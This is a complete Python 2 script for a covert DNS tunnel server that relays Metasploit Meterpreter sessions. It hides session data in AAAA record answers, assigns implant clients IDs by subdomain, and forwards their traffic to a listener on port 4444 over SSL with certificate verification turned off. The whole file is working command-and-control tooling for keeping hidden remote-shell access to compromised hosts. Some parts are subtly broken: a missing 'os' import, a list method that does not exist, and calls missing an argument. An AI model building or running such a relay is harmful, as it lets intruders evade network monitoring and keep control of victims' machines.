#!/usr/bin/env python
# coding=utf-8

import argparse
import sys
import time
import threading
import SocketServer
import struct
import re
import ssl
import Queue
import base64
import logging
from logging.handlers import RotatingFileHandler
import socket
import select

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

DNS_LOG_NAME = "dns.log"
root_logger = logging.getLogger()
root_logger.setLevel(logging.INFO)
# add handler to the root logger
formatter = logging.Formatter("%(asctime)s %(name)-24s %(levelname)-8s %(message)s")
# rotating log file after 5 MB
handler = RotatingFileHandler(DNS_LOG_NAME, maxBytes=5*1024*1024, backupCount=5)
handler.setFormatter(formatter)
handler.setLevel(logging.DEBUG)
root_logger.addHandler(handler)

logger = logging.getLogger("dns_server")


def pack_byte_to_hn(val):
    """
    Pack byte to network order unsigned short
    """
    return (val << 8) & 0xffff


def pack_2byte_to_hn(low_byte, high_byte):
    """
    Pack 2 bytes to network order unsigned short
    """
    return ((low_byte << 8) | high_byte) & 0xffff


def pack_ushort_to_hn(val):
    """
    Pack unsigned short to network order unsigned short
    """
    return ((val & 0xff) << 8) | ((val & 0xff00) >> 8) & 0xffff


def xor_bytes(key, data):
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class Encoder(object):
    MAX_PACKET_SIZE = -1
    MIN_VAL_DOMAIN_SYMBOL = ord('a')
    MAX_VAL_DOMAIN_SYMBOL = ord('z')

    @staticmethod
    def get_next_sdomain(current_sdomain):

        def increment(lst, index):
            carry_flag = False
            val = lst[index]
            assert(val >= Encoder.MIN_VAL_DOMAIN_SYMBOL)
            if val > Encoder.MAX_VAL_DOMAIN_SYMBOL:
                lst[index] = Encoder.MIN_VAL_DOMAIN_SYMBOL
                carry_flag = True
            else:
                lst[index] += 1
            return carry_flag

        lst = [ord(x) for x in reversed(current_sdomain)]
        for i, _ in enumerate(lst):
            if not increment(lst, i):
                break

        return ''.join([chr(x) for x in reversed(lst)])

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        raise NotImplementedError()

    @staticmethod
    def encode_packet(packet_data):
        raise NotImplementedError()

    @staticmethod
    def encode_ready_receive():
        raise NotImplementedError()

    @staticmethod
    def encode_finish_send():
        raise NotImplementedError()

    @staticmethod
    def encode_send_more_data():
        raise NotImplementedError()

    @staticmethod
    def encode_registration():
        raise NotImplementedError()


class IPv6Encoder(Encoder):
    MAX_IPV6RR_NUM = 17
    MAX_DATA_IN_RR = 14
    MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
    IPV6_FORMAT = ":".join(["{:04x}"]*8)

    @staticmethod
    def _encode_nextdomain_datasize(next_domain, data_size):
        res = [0xfe81]
        for ch in next_domain:
            res.append(pack_byte_to_hn(ord(ch)))
        res.append(pack_2byte_to_hn(0 if data_size <= IPv6Encoder.MAX_PACKET_SIZE else 1, data_size & 0xff))
        res.append(pack_ushort_to_hn(data_size >> 8 & 0xffff))
        res.append(pack_byte_to_hn(data_size >> 24 & 0xff))
        return res

    @staticmethod
    def _encode_data_prefix(prefix, index, data):
        assert(len(data) <= IPv6Encoder.MAX_DATA_IN_RR)
        assert(index < IPv6Encoder.MAX_IPV6RR_NUM)
        res = []
        data_size = len(data)
        res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
        for i in range(data_size//2):
            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
        if data_size % 2 != 0:
            res.append(pack_byte_to_hn(ord(data[data_size-1])))
        return res

    @staticmethod
    def _align_hextets(hextests):
        l = len(hextests)
        if l < 8:
            hextests += [0] * (8-l)
        return hextests

    @staticmethod
    def hextets_to_str(hextets):
        return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))

    @staticmethod
    def encode_data_header(sub_domain, data_size):
        return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]

    @staticmethod
    def encode_data(data):
        logger.info("Encoding data...")
        ipv6blocks = []  # Block of IPv6 addresses
        data_size = len(data)
        logger.debug("Data size - %d bytes", data_size)
        index = 0
        while index < data_size:
            block = []
            next_index = index + IPv6Encoder.MAX_PACKET_SIZE
            if next_index < data_size:
                # full block
                for i in range(IPv6Encoder.MAX_IPV6RR_NUM):
                    is_last = (i == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
                    cur_pos = index + i * IPv6Encoder.MAX_DATA_IN_RR
                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                              i, data[cur_pos:cur_pos + IPv6Encoder.MAX_DATA_IN_RR])
                    block.append(IPv6Encoder.hextets_to_str(hextets))
            else:
                # partial block
                i = 0
                block_size = data_size - index
                while i < block_size:
                    next_i = i + IPv6Encoder.MAX_DATA_IN_RR
                    if next_i > block_size:
                        next_i = block_size
                    num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
                    is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
                    cur_pos = index + i
                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                              num_rr, data[cur_pos:cur_pos + (next_i-i)])
                    block.append(IPv6Encoder.hextets_to_str(hextets))
                    i = next_i

            ipv6blocks.append(block)
            index = next_index
        logger.info("Encoding done. %d ipv6 blocks generated", len(ipv6blocks))
        logger.debug("IPv6Blocks data: %s", ipv6blocks)
        return ipv6blocks

    @staticmethod
    def encode_packet(packet_data):
        data_len = len(packet_data)
        if data_len > IPv6Encoder.MAX_PACKET_SIZE:
            raise ValueError("Data length is bigger than maximum packet size")
        block = []
        i = 0
        while i < data_len:
            next_i = min(i + IPv6Encoder.MAX_DATA_IN_RR, data_len)
            num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
            is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
            hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                      num_rr, packet_data[i:next_i])
            block.append(IPv6Encoder.hextets_to_str(hextets))
            i = next_i
        return block

    @staticmethod
    def encode_ready_receive():
        return ["ffff:0000:0000:0000:0000:0000:0000:0000"]

    @staticmethod
    def encode_finish_send():
        return ["ffff:0000:0000:0000:0000:ff00:0000:0000"]

    @staticmethod
    def encode_send_more_data():
        return ["ffff:0000:0000:0000:0000:f000:0000:0000"]

    @staticmethod
    def encode_registration(client_id, status):
        return ["ffff:"+hex(ord(client_id))[2:4]+"00:0000:0000:0000:0000:0000:0000"]


class PartedData(object):
    def __init__(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def reset(self, expected_size=0):
        self.expected_size = expected_size
        self.current_size = 0
        self.data = ""

    def add_part(self, data):
        data_len = len(data)
        if (self.current_size + data_len) > self.expected_size:
            raise ValueError("PartedData overflow")
        self.data += data
        self.current_size += data_len

    def is_complete(self):
        return self.expected_size == self.current_size

    def get_data(self):
        return self.data

    def get_expected_size(self):
        return self.expected_size

    def remain_size(self):
        return self.expected_size - self.current_size


class BlockSizedData(object):
    def __init__(self, data, block_size):
        self.data = data
        self.block_size = block_size
        self.data_size = len(self.data)

    def get_data(self, block_index):
        start_index = block_index * self.block_size
        if start_index >= self.data_size:
            raise IndexError("block index out of range")

        end_index = min(start_index + self.block_size, self.data_size)
        is_last = self.data_size == end_index
        return is_last, self.data[start_index:end_index]

    def get_size(self):
        return self.data_size


class Registrator(object):
    __instance = None

    @staticmethod
    def instance():
        if not Registrator.__instance:
            Registrator.__instance = Registrator()
        return Registrator.__instance

    def __init__(self):
        self.id_list = [chr(i) for i in range(ord('a'), ord('z')+1)]
        self.clients = {}
        self.servers = {}
        self.waited_servers = {}
        self.lock = threading.Lock()
        self.logger = logging.getLogger(self.__class__.__name__)

    def register_client_for_server(self, server_id, client):
        client_id = None
        notify_server = False
        with self.lock:
            try:
                client_id = self.id_list.pop(0)
                self.clients[client_id] = client
                client_lst = self.servers.get(server_id, [])
                client_lst.append(client)
                self.servers[server_id] = client_lst
                notify_server = True
            except IndexError as e:
                self.logger.error("Can't register new client for server %s(no free ids)", server_id, exc_info=True)
                return None
        if notify_server:
            self._notify_waited_servers(server_id)
        return client_id

    def _notify_waited_servers(self, server_id):
        notify_server = None
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                notify_server = waited_lst.pop(0)
                if not waited_lst:
                    del self.waited_servers[server_id]
        if notify_server:
            notify_server.new_client()

    def subscribe(self, server_id, server):
        with self.lock:
            server_lst = self.waited_servers.get(server_id, [])
            server_lst.append(server)
            self.waited_servers[server_id] = server_lst
        self.logger.info("Subscription is done for server with %s id.", server_id)

    def unsubscribe(self, server_id, server):
        with self.lock:
            waited_lst = self.waited_servers.get(server_id, [])
            if waited_lst:
                i = waited_lst.find(server)
                if i != -1:
                    waited_lst.pop(i)
        self.logger.info("Unsubscription is done for server with %s id.", server_id)


    def get_client_by_id(self, client_id):
        with self.lock:
            try:
                return self.clients[client_id]
            except KeyError as e:
                return None

    def get_new_client_for_server(self, server_id):
        assigned_client = None
        with self.lock:
            try:
                clients = self.servers.get(server_id, [])
                assigned_client = clients.pop(0)
                if len(clients) == 0:
                    del self.servers[server_id]
            except IndexError as e:
                pass
        return assigned_client

    def unregister_client(self, client_id):
        with self.lock:
            try:
                del self.clients[client_id]
                self.id_list.append(client_id)
            except KeyError as e:
                self.logger.error("Can't unregister client: client with id %s has not found", client_id)


class Client(object):
    INITIAL = 1
    INCOMING_DATA = 2

    def __init__(self):
        self.state = self.INITIAL
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.received_data = PartedData()
        self.last_received_index = -1
        self.sub_domain = "aaaa"
        self.send_data = None
        self.server_queue = Queue.Queue()
        self.client_queue = Queue.Queue()
        self.server = None
        self.client_id = None

    def register_client(self, server_id, encoder):
        client_id = Registrator.instance().register_client_for_server(server_id, self)
        if client_id:
            self.client_id = client_id
            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
            return encoder.encode_registration(client_id, 0)
        else:
            self.logger.info("Can't register client")
            return encoder.encode_finish_send()

    def get_id(self):
        return self.client_id

    def _setup_receive(self, exp_data_size, padding):
        self.state = self.INCOMING_DATA
        self.received_data.reset(exp_data_size)
        self.last_received_index = -1
        self.padding = padding

    def _initial_state(self):
        self.state = self.INITIAL
        self.received_data.reset()
        self.last_received_index = -1
        self.padding = 0

    def set_server(self, server):
        self.server = server

    def incoming_data_header(self, data_size, padding, encoder):
        if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
            return encoder.encode_ready_receive()
        elif self.state == self.INCOMING_DATA:
            self.logger.error("Bad request. Client in the receiving data state")
            return None
        self.logger.info("Data header: waiting %d bytes of data", data_size)
        self._setup_receive(data_size, padding)
        return encoder.encode_ready_receive()

    def incoming_data(self, data, index, counter, encoder):
        self.logger.debug("Data %s, index %d", data, index)
        if self.state != self.INCOMING_DATA:
            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
            return encoder.encode_finish_send()

        data_size = len(data)
        if data_size == 0:
            self.logger.error("Empty incoming data. Send finish.")
            return encoder.encode_finish_send()

        if self.last_received_index >= index:
            self.logger.info("Duplicated packet.")
            return encoder.encode_send_more_data()

        try:
            self.received_data.add_part(data)
        except ValueError:
            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
            self._initial_state()
            return encoder.encode_finish_send()

        self.last_received_index = index
        if self.received_data.is_complete():
            self.logger.info("All expected data is received")
            try:
                packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
                self.logger.info("Put decoded data to the server queue")
                self.server_queue.put(packet)
                self._initial_state()
                if self.server:
                    self.logger.info("Notify server")
                    self.server.notify_data()
            except Exception:
                self.logger.error("Error during decode received data", exc_info=True)
                self._initial_state()
                return encoder.encode_finish_send()
        return encoder.encode_send_more_data()

    def request_data_header(self, sub_domain, encoder):
        if sub_domain == self.sub_domain:
            if not self.send_data:
                try:
                    self.logger.info("Checking client queue...")
                    data = self.client_queue.get_nowait()
                    self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
                    self.logger.debug("New data size is %d", len(data))
                except Queue.Empty:
                    pass
            data_size = 0
            if self.send_data:
                next_sub = encoder.get_next_sdomain(self.sub_domain)
                sub_domain = next_sub
                data_size = self.send_data.get_size()
            else:
                self.logger.info("No data for client.")
            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
            return encoder.encode_data_header(sub_domain, data_size)
        else:
            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
            if sub_domain == "aaaa":
                self.logger.info("MIGRATE.")
                self.sub_domain = sub_domain
                self.send_data = None
            else:
                self.sub_domain = sub_domain
                self.send_data = None

    def request_data(self, sub_domain, index, encoder):
        self.logger.debug("request_data - %s, %d", sub_domain, index)
        if sub_domain != self.sub_domain:
            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
            return None

        if not self.send_data:
            self.logger.error("Bad request. There are no data.")
            return None

        try:
            _, data = self.send_data.get_data(index)
            self.logger.debug("request_data: return data %s", data)
            return encoder.encode_packet(data)
        except ValueError:
            self.logger.error("request_data: index(%d) out of range.", index)

    def server_put_data(self, data):
        self.logger.info("Server adds data to queue.")
        self.client_queue.put(data)

    def server_get_data(self, timeout=2):
        self.logger.info("Checking server queue...")
        data = None
        try:
            data = self.server_queue.get(True, timeout)
            self.logger.info("There are new data(length=%d) for the server", len(data))
        except Queue.Empty:
            pass
        return data

    def server_has_data(self):
        return not self.server_queue.empty()


class Request(object):
    EXPR = None
    OPTIONS = []
    LOGGER = logging.getLogger("Request")

    @classmethod
    def match(cls, qname):
        if cls.EXPR:
            return cls.EXPR.match(qname)

    @classmethod
    def handle(cls, qname, dns_cls):
        m = cls.match(qname)
        if not m:
            return None
        params = m.groupdict()
        client = None
        client_id = params.pop("client", None)
        if client_id is None:
            if "new_client" in cls.OPTIONS:
                Request.LOGGER.info("Create a new client.")
                client = Client()
        else:
            client = Registrator.instance().get_client_by_id(client_id)
        if client is not None:
            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
            params["encoder"] = dns_cls.encoder

            return cls._handle_client(client, **params)
        else:
            Request.LOGGER.error("Can't find client with name %s", client_id)
        return None

    @classmethod
    def _handle_client(cls, client, **kwargs):
        raise NotImplementedError()


class GetDataHeader(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        encoder = kwargs['encoder']
        return client.request_data_header(sub_domain, encoder)


class GetStageHeader(Request):
    EXPR = re.compile(r"7812\.000g\.(?P<rnd>\d+)\.")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = '7812'
        return client.request_data_header(sub_domain)


class GetDataRequest(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = kwargs['sub_dom']
        index = int(kwargs['index'])
        encoder = kwargs['encoder']
        return client.request_data(sub_domain, index, encoder)


class GetStageRequest(Request):
    EXPR = re.compile(r"7812\.(?P<index>\d+)\.(?P<rnd>\d+)\.")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        sub_domain = '7812'
        index = int(kwargs['index'])
        return client.request_data(sub_domain, index)


class IncomingDataRequest(Request):
    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        enc_data = kwargs['base64']
        counter = int(kwargs['cnt'])
        index = int(kwargs['idx'])
        encoder = kwargs['encoder']
        enc_data = re.sub(r"\.", "", enc_data)
        return client.incoming_data(enc_data, index, counter, encoder)


class IncomingDataHeaderRequest(Request):
    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, **kwargs):
        size = int(kwargs['size'])
        padding = int(kwargs['padd'])
        encoder = kwargs['encoder']
        return client.incoming_data_header(size, padding, encoder)


class IncomingNewClient(Request):
    EXPR = re.compile(r"7812\.reg0\.\d+\.(?P<server_id>\w+)")
    OPTIONS = ["new_client"]

    @classmethod
    def _handle_client(cls, client, **kwargs):
        return client.register_client(kwargs['server_id'], kwargs['encoder'])


class AAAARequestHandler(object):
    encoder = IPv6Encoder

    def __init__(self, domain):
        self.domain = domain
        self.logger = logging.getLogger(self.__class__.__name__)
        # self.logger.setLevel(logging.DEBUG)
        self.request_handler = [
            IncomingDataHeaderRequest,
            IncomingDataRequest,
            GetDataRequest,
            GetDataHeader,
            IncomingNewClient
        ]

    def process_request(self, reply, qname):
        # cut domain from requested qname
        i = qname.rfind("." + self.domain)
        if i == -1:
            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
            return
        sub_domain = qname[:i]
        self.logger.info("requested subdomain name is %s", sub_domain)
        is_handled = False
        for handler in self.request_handler:
            answer = handler.handle(sub_domain, self.__class__)
            if answer is not None:
                for rr in answer:
                    self.logger.debug("Add resource record to the reply %s", rr)
                    reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=1,
                                        rdata=AAAA(rr)))
                is_handled = True
                break
        if not is_handled:
            self.logger.error("Request with subdomain %s doesn't handled", qname)


class DnsServer(object):
    __instance = None

    @staticmethod
    def create(domain, ipv4, ns_servers):
        if not DnsServer.__instance:
            DnsServer.__instance = DnsServer(domain, ipv4, ns_servers)

    @staticmethod
    def get_instance():
        return DnsServer.__instance

    def __init__(self, domain, ipv4, ns_servers):
        self.domain = domain + "."
        self.ipv4 = ipv4
        self.ns_servers = ns_servers
        self.logger = logging.getLogger(self.__class__.__name__)
        self.handlers = {
            QTYPE.NS: self._process_ns_request,
            QTYPE.A: self._process_a_request,
            QTYPE.AAAA: self._process_aaaa_request,
        }
        self.aaaa_handler = AAAARequestHandler(self.domain)

    def process_request(self, request):
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = request.q.qname
        qn = str(qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qn.endswith(self.domain):
            if qtype in self.handlers:
                self.logger.info("Process request for type %s", qt)
                self.handlers[qtype](reply, qn)
            else:
                self.logger.info("%s request type is not supported", qt)
        else:
            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
        self.logger.info("Send reply for DNS request")
        self.logger.debug("Reply data: %s", reply)
        return reply.pack()

    def _process_ns_request(self, reply, qname):
        for server in self.ns_servers:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=1, rdata=server))

    def _process_a_request(self, reply, qname):
        self.logger.info("Send answer for A request - %s", self.ipv4)
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=1, rdata=A(self.ipv4)))

    def _process_aaaa_request(self, reply, qname):
        if self.aaaa_handler is not None:
            self.aaaa_handler.process_request(reply, qname)


def dns_response(data):
    try:
        request = DNSRecord.parse(data)
        dns_server = DnsServer.get_instance()
        if dns_server:
            return dns_server.process_request(request)
        else:
            logger.error("Dns server is not created.")
    except Exception as e:
        logger.error("Parse error " + str(e), exc_info=True)
    return None


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        logger.info("DNS request %s (%s %s):", self.__class__.__name__[:3], self.client_address[0],
                    self.client_address[1])
        try:
            data = self.get_data()
            logger.debug("Size:%d, data %s", len(data), data)
            dns_ans = dns_response(data)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            logger.error("Exception in request handler.", exc_info=True)


class MSFClient(object):
    HEADER_SIZE = 8
    BUFFER_SIZE = 2048

    INITIAL = 1
    WAIT_CLIENT = 2
    IDLE = 3
    RECEIVING_DATA = 4

    LOGGER = logging.getLogger("MSFClient")

    def __init__(self, sock, server):
        self.sock = sock
        self.ssl_socket = None
        self.working_socket = sock
        self.msf_data = PartedData()
        self.state = MSFClient.INITIAL
        self.server = server
        self.msf_id = ""
        self.client = None

    def get_socket(self):
        return self.working_socket if self.state != self.WAIT_CLIENT else None

    def _setup_ssl(self):
        if self.ssl_socket is None:
            MSFClient.LOGGER.info("Create ssl socket")
            try:
                self.sock.setblocking(True)
                self.ssl_socket = ssl.wrap_socket(self.sock,
                            # keyfile = "server.key",
                            # ca_certs="server.crt",
                            cert_reqs=ssl.CERT_NONE,
                            server_side=False)
                self.ssl_socket.setblocking(False)
                self.ssl_socket.write("GET /123456789 HTTP/1.0\r\n\r\n")
                self.working_socket = self.ssl_socket
            except:
                MSFClient.LOGGER.error("Can't create ssl context:", exc_info=True)
                self.sock.close()
                self.server.remove_me(self)

    def _read_data(self, size):
        data = None
        try:
            data = self.working_socket.recv(size)
            if not data:
                MSFClient.LOGGER.info("SSL connection closed by client")
                # self.ssl_socket.unwrap()
                self.ssl_socket = None
                MSFClient.LOGGER.info("Trying to setup new SSL connection.")
                self._setup_ssl()
                return None
            return data
        except ssl.SSLWantReadError:
            MSFClient.LOGGER.info("Not all data is prepared for decipher.Reread data later.")
            # add small sleep
            time.sleep(0.1)
            return None
        except:
            # connection closed
            if self.client:
                client_id = self.client.get_id()
                if client_id:
                    MSFClient.LOGGER.info("Closing MSF connection and unregister client with id %s", client_id)
                    Registrator.instance().unregister_client(client_id)
            MSFClient.LOGGER.error("Exception during read", exc_info=True)
            return None

    def new_client(self):
        if self.state == MSFClient.WAIT_CLIENT:
            client = Registrator.instance().get_new_client_for_server(self.msf_id)
            if client:
                self.client = client
                client.set_server(self)
                self._setup_ssl()
                self.state = MSFClient.IDLE
                Registrator.instance().unsubscribe(self.msf_id, self)
                self.notify_data()
        else:
            self.LOGGER.error("Bad state(%d) for new client", self.state)

    def read_new_data(self):
        if self.state == MSFClient.INITIAL:
            # read msf id and register server
            # msf id format: 1 byte - size, 2 .. size+1 - msf id
            id_size_byte = self._read_data(1)
            if id_size_byte:
                id_size = struct.unpack("B", id_size_byte)[0]
                msf_id = self._read_data(id_size)
                if len(msf_id) == id_size:
                    self.msf_id = msf_id
                    client = Registrator.instance().get_new_client_for_server(msf_id)
                    if client:
                        self.client = client
                        client.set_server(self)
                        self._setup_ssl()
                        self.state = MSFClient.IDLE
                    else:
                        Registrator.instance().subscribe(self.msf_id, self)
                        self.state = MSFClient.WAIT_CLIENT
                else:
                    self.LOGGER.error("Incorrect server id data.Closing socket.")
                    self.sock.close()
                    self.server.remove_me(self)
        elif self.state == MSFClient.WAIT_CLIENT:
            client = Registrator.get_new_client_for_server(self.msf_id)
            if client:
                self.client = client
                client.set_server(self)
                self._setup_ssl()
                self.state = MSFClient.IDLE
        elif self.state == MSFClient.IDLE:
            # read header
            header = self._read_data(MSFClient.HEADER_SIZE)

            if header is None:
                return

            if len(header) != MSFClient.HEADER_SIZE:
                MSFClient.LOGGER.error("Can't read full header)")
                return
            MSFClient.LOGGER.debug("PARSE HEADER")
            xor_key = header[:4][::-1]
            pkt_length_binary = xor_bytes(xor_key, header[4:8])
            pkt_length = struct.unpack('>I', pkt_length_binary)[0]
            self.msf_data.reset(pkt_length+4)
            MSFClient.LOGGER.info("Incoming packet %d bytes", pkt_length+4)
            self.msf_data.add_part(header)

        data = self._read_data(self.msf_data.remain_size())
        if data is None:
            return
        self.msf_data.add_part(data)

        if self.msf_data.is_complete():
            self.send_to_client()
        else:
            self.state = MSFClient.RECEIVING_DATA

    def want_write(self):
        if self.client:
            return self.client.server_has_data()
        return False

    def notify_data(self):
        self.server.poll()

    def send_to_client(self):
        MSFClient.LOGGER.info("All data from server is read. Sending to client.")
        if self.client:
            self.client.server_put_data(self.msf_data.get_data())
        else:
            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)
        self.msf_data.reset()
        self.state = MSFClient.IDLE

    def write_data(self):
        if self.client:
            data = self.client.server_get_data()
            if data:
                MSFClient.LOGGER.info("Send data to server - %d bytes", len(data))
                self.working_socket.write(data)

    def close(self):
        self.working_socket.close()


class MSFListener(object):
    SELECT_TIMEOUT = 10

    def __init__(self, listen_addr="0.0.0.0", listen_port=4444):
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.setblocking(False)
        self.shutdown_event = threading.Event()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.clients = []
        pipe = os.pipe()
        self.poll_pipe = (os.fdopen(pipe[0], "r", 0), os.fdopen(pipe[1], "w", 0))
        self.loop_thread = None

    def remove_me(self, client):
        try:
            self.clients.remove(client)
        except:
            pass

    def poll(self):
        self.poll_pipe[1].write("\x90")

    def shutdown(self):
        self.logger.info("request for shutdown server")
        self.shutdown_event.set()
        self.poll()
        if self.loop_thread:
            self.loop_thread.join()
        self.loop_thread = None

    def start_loop(self):
        self.loop_thread = threading.Thread(target=self.loop)
        self.loop_thread.daemon = True
        self.loop_thread.start()

    def loop(self):
        self.logger.info("Server internal loop started.")
        self.listen_socket.bind((self.listen_addr, self.listen_port))
        self.listen_socket.listen(1)

        while not self.shutdown_event.is_set():
            inputs = [self.listen_socket, self.poll_pipe[0]]
            outputs = []

            for cl in self.clients:
                s = cl.get_socket()
                if s:
                    inputs.append(s)
                    if cl.want_write():
                        outputs.append(s)

            read_lst, write_lst, exc_lst = select.select(inputs, outputs, inputs, MSFListener.SELECT_TIMEOUT)

            # handle input
            for s in read_lst:
                if s is self.listen_socket:
                    connection, address = s.accept()
                    self.logger.info("Incoming connection from address %s", address)
                    self.clients.append(MSFClient(connection, self))
                elif s is self.poll_pipe[0]:
                    self.logger.debug("Polling")
                    s.read(1)
                else:
                    self.logger.info("Socket is ready for reading")
                    for cl in self.clients:
                        if cl.get_socket() == s:
                            cl.read_new_data()
                        else:
                            self.logger.error("Can't find client for this connection")

            # handle write
            for s in write_lst:
                for cl in self.clients:
                    if cl.get_socket() == s:
                        cl.write_data()
        # close sockets after exit from loop
        self.listen_socket.close()
        for cl in self.clients:
            cl.close()
        self.logger.info("Internal loop is ended")


class TCPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
    parser.add_argument('--domain', type=str, required=True, help='The domain name')
    parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')

    args = parser.parse_args()
    ns_records = []

    D = DomainName(args.domain + '.')  # Init domain string
    ns_records.append(NS(D.ns1))
    ns_records.append(NS(D.ns2))

    DnsServer.create(args.domain, args.ipaddr, ns_records)

    logger.info("Creating MSF listener ...")
    listener = MSFListener('0.0.0.0', args.lport)
    listener.start_loop()

    logger.info("Starting nameserver ...")
    servers = []
    servers.append(SocketServer.UDPServer(('', args.dport), UDPRequestHandler))
    servers.append(SocketServer.TCPServer(('', args.dport), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Shutdown server...")
        for s in servers:
            s.shutdown()
        listener.shutdown()
        logging.shutdown()


if __name__ == '__main__':
    main()
